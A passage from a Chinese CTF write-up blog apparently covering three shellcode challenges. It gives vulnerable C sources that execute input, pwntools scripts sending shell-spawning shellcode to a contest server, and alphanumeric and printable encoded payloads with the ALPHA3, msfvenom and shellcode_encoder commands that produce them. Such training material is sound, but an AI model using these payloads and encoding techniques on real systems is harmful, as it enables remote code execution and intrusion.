+</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;DEBUG&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># p = process(&#39;./chall1&#39;)</span>
+</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;202.38.93.241&#39;</span><span class=p>,</span> <span class=mi>10000</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>)</span> <span class=c1># token</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>()))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=2>2</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// gcc -m32 -z execstack -fPIE -pie -z now chall2.c -o chall2
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mh>0x200</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>n</span><span class=p>,</span> <span class=n>i</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>n</span> <span class=o>&lt;=</span> <span class=mi>0</span><span class=p>)</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>n</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=p>((</span><span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=mi>65</span> <span class=o>&amp;&amp;</span> <span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=mi>90</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=mi>48</span> <span class=o>&amp;&amp;</span> <span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=mi>57</span><span class=p>)))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>((</span><span class=kt>void</span><span class=p>(</span><span class=o>*</span><span class=p>)(</span><span class=kt>void</span><span class=p>))</span><span class=n>buf</span><span class=p>)();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这题在上一题的基础上限制了输入字符必须是大写字母或数字，并且是基于 x86 的。可以用类似 <a href=https://github.com/SkyLined/alpha3 target=_blank rel="noopener noreffer">ALPHA3</a> 的工具对 <code>shellcode</code> 进行转换。先将 <code>shellcode</code> 写入文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;shellcode.bin&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>  <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>()))</span>
+</span></span></code></pre></td></tr></table></div></div><p>随后使用 ALPHA3 进行转化：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ py -2 ALPHA3.py x86 ascii uppercase eax --input<span class=o>=</span><span class=s2>&#34;shellcode.bin&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>得到的结果就是新的 payload。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;DEBUG&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#p=process(&#39;./chall2&#39;)</span>
+</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;202.38.93.241&#39;</span><span class=p>,</span> <span class=mi>10002</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>)</span> <span class=c1># token</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;PYVTX10X41PZ41H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE2O0Z2G7O1E7M04KO1P0S2L0Y3T3CKL0J0N000Q5A1W66MN0Y0X021U9J622A0H1Y0K3A7O5I3A114CKO0J1Y4Z5F06&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>看到 flag 后发现，预期解是利用 <code>msfvenom</code> 生成 <code>shellcode</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ msfvenom -a x86 --platform linux -p linux/x86/exec <span class=nv>CMD</span><span class=o>=</span><span class=s2>&#34;/bin/sh&#34;</span> -e x86/alpha_upper <span class=nv>BufferRegister</span><span class=o>=</span>eax
+</span></span></code></pre></td></tr></table></div></div><h3 id=3>3</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// gcc -m64 -z execstack -fPIE -pie -z now chall3.c -o chall3
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mh>0x400</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>n</span><span class=p>,</span> <span class=n>i</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x400</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>n</span> <span class=o>&lt;=</span> <span class=mi>0</span><span class=p>)</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>n</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;</span><span class=mi>32</span> <span class=o>||</span> <span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>126</span><span class=p>)</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>((</span><span class=kt>void</span><span class=p>(</span><span class=o>*</span><span class=p>)(</span><span class=kt>void</span><span class=p>))</span><span class=n>buf</span><span class=p>)();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>本题的限制是 <code>shellcode</code> 由可打印字符构成，且基于 x64 平台。这个似乎靠 <code>msfvenom</code> 就不行了，但是可以换个工具，用 <a href=https://github.com/ecx86/shellcode_encoder target=_blank rel="noopener noreffer">shellcode_encoder</a>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ python2 main.py shellcode.bin rax+29
+</span></span></code></pre></td></tr></table></div></div><p>即可生成 payload，替换第二题的 payload 即可。注意 <code>rax+29</code> 指 shellcode 开始执行的位置。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;DEBUG&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;202.38.93.241&#39;</span><span class=p>,</span> <span class=mi>10004</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1>#p=process(&#39;./chall3&#39;)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>)</span> <span class=c1># token</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;&#39;&#39;PPTAYAXVI31VXXXf-c?f-@`f-@`PZTAYAXVI31VXPP[_Hc4:14:SX-b+e2-( _`5&gt;??_P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-IOF`-A`! 5&gt;_7;P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-&lt;hh)-h`  5n???P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-@{#&#39;-ux @5O6?_P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-@#6p-B 0`5v?_?P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-2 u@-&amp;@@ 5-_?wP^14:WX-????-}`aC-@`_}P_SX- ut*- ,Lv5X_?_P_Hc4:14:SX-Q !0-#@  5s}.?P^14:WX-????-}`aC-@`_}P_SX-8 `$-%`&#34;|5?~}_P^SX-Ma`R-~c`p5-;?=P_AAAA!bt#MvAr*o$$&gt;I`_UXyyi;||s}_r=60d|jcEH(u&#39;&amp;w6~7AM;wy4II+f&#39;Gw+X#e0T|t30Q.$A&gt;6p?&#39;B[A&lt;zDBH)6f0Rj#XO$&#39;&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2019-10-15</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/javascript/>Javascript</a>,&nbsp;<a href=/tags/%E6%95%B0%E5%AD%A6/>数学</a>,&nbsp;<a href=/tags/ssrf/>SSRF</a>,&nbsp;<a href=/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/>整数溢出</a>,&nbsp;<a href=/tags/dns/>DNS</a>,&nbsp;<a href=/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/>正则表达式</a>,&nbsp;<a href=/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%B8%8E%E7%BC%96%E7%A0%81/>古典密码与编码</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/pwnkr-toddler/ class=prev rel=prev title="Pwnable.kr Toddler's Bottle 练习记录"><i class="fas fa-angle-left fa-fw"></i>Pwnable.kr Toddler's Bottle 练习记录</a>
+<a href=/bugku-pwn/ class=next rel=next title="Bugku Pwn 练习记录">Bugku Pwn 练习记录<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.94.0">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2017 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Mercury</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
+</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.css><link rel=stylesheet href=/lib/katex/katex.min.css><script type=text/javascript src=/lib/valine/Valine.min.js></script><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/algoliasearch/algoliasearch-lite.umd.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/auto-render.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:30},comment:{valine:{appId:"RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",appKey:"sw2sEPOl4haCAXKUFYiBFMrR",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"zh-cn",pageSize:10,placeholder:"你的评论 ...",recordIP:!1,visitor:!0}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"P149SBLX5U",algoliaIndex:"blog",algoliaSearchKey:"cbd5db1f3910ee11bc18688f21b64bd4",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:50,type:"algolia"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
